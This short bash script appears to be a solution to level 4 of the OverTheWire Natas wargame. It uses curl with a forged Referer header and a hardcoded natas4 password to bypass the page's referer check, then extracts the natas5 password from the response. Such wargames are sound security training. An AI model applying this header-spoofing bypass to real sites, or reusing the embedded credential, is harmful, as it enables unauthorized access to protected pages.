#!/usr/bin/bash

curl -s --referer http://natas5.natas.labs.overthewire.org/ -u natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ http://natas4.natas.labs.overthewire.org/ | grep -oP '(?<=(natas5 is )).*'

